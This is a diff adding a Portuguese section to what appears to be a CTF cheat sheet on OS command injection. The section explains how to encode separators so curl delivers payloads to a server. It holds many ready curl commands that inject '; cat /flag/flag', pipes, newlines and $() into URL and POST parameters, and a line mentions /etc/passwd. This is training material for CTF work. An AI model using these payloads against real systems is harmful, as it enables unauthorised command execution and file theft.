@@ -42,6 +42,95 @@ Se algum mostra conteúdo de `/etc/passwd` → OS injection confirmado. Depois m
 
 ---
 
+## ATENÇÃO: como enviar payloads com curl sem o TEU terminal estragar tudo
+
+O teu shell (zsh/bash) interpreta `;`, `|`, `&`, `$()`, espaços e outros caracteres **antes** de os enviar ao servidor. Se não tiveres cuidado, o comando executa **localmente no teu Mac** em vez de no servidor remoto.
+
+### Regra de ouro: URL na URL, shell no body
+
+| Método | Como enviar `; cat /flag/flag` |
+|--------|-------------------------------|
+| **GET (payload na URL)** | Encodar TUDO: `%3b`, `%20`, `%7c`... |
+| **POST (payload no body)** | Aspas + `-d` ou `--data-urlencode` |
+
+### GET — payload vai na URL
+
+**O teu terminal interpreta `;` e espaços.** Tens de URL-encodar os caracteres especiais:
+
+| Caracter | URL-encoded |
+|----------|------------|
+| `;` | `%3b` |
+| espaço | `%20` |
+| `\|` | `%7c` |
+| `&` | `%26` |
+| `$` | `%24` |
+| `` ` `` | `%60` |
+| `(` | `%28` |
+| `)` | `%29` |
+| `\n` (newline) | `%0a` |
+| `#` | `%23` |
+
+```bash
+# ERRADO — o teu zsh interpreta o ; e executa "cat flag" localmente!
+curl -s https://target.com/cowsay/ok;cat flag.txt
+
+# ERRADO — \ escapa no zsh mas o servidor recebe literal, não como separador
+curl -s "https://target.com/cowsay/ok\;cat flag.txt"
+
+# CORRETO — tudo URL-encoded, entre aspas
+curl -s "https://target.com/cowsay/ok%3bcat%20flag.txt"
+
+# Mais exemplos corretos:
+curl -s "https://target.com/ping?host=localhost%3bcat%20/flag/flag"
+curl -s "https://target.com/run?cmd=ls%7ccat%20/flag/flag"         # pipe
+curl -s "https://target.com/run?cmd=ls%0acat%20/flag/flag"         # newline
+curl -s "https://target.com/run?cmd=%24(cat%20/flag/flag)"         # $(...)
+```
+
+### POST — payload vai no body
+
+Com POST é mais simples — o `-d` ou `--data-urlencode` protege-te:
+
+```bash
+# Método 1: -d com aspas (funciona para ; e espaços simples)
+curl -s -X POST http://target.com/ping -d "host=localhost; cat /flag/flag"
+# O -d envia o body raw, o shell não interpreta ; dentro das aspas
+
+# Método 2: --data-urlencode (o curl encoda por ti — mais seguro)
+curl -s -X POST http://target.com/ping --data-urlencode "host=localhost; cat /flag/flag"
+
+# Método 3: para newlines e chars especiais
+curl -s -X POST http://target.com/label --data-urlencode $'text=hello\ncat /flag/flag'
+```
+
+### Diagnóstico rápido: "quem está a executar o comando?"
+
+| Sintoma | Problema |
+|---------|----------|
+| Vês ficheiros do TEU Mac (Desktop, Documents...) | O comando executou **localmente** — o `;` foi interpretado pelo teu shell |
+| `curl: option -xxx: blank argument` | O espaço partiu o comando do curl — faltam aspas ou `%20` |
+| O servidor mostra o payload como texto literal (ex: cowsay diz `ok;ls`) | O `;` chegou ao servidor mas não foi interpretado como separador — tentar `%3b` ou outro separador |
+| Resposta vazia | O comando executou no servidor mas sem output — tentar redirecionar ou ver logs |
+
+### Tabela de conversão rápida
+
+```
+Quero enviar:    localhost; cat /flag/flag
+Na URL fica:     localhost%3bcat%20/flag/flag
+                 localhost%3b%20cat%20/flag/flag    (com espaço antes do cat)
+
+Quero enviar:    $(cat /flag/flag)
+Na URL fica:     %24%28cat%20/flag/flag%29
+
+Quero enviar:    ok\ncat /flag/flag    (newline)
+Na URL fica:     ok%0acat%20/flag/flag
+
+Quero enviar:    ls | cat /flag/flag
+Na URL fica:     ls%7ccat%20/flag/flag
+```
+
+---
+
 ## Técnicas por situação
 
 ### 1. Separador ponto-e-vírgula (`;`)
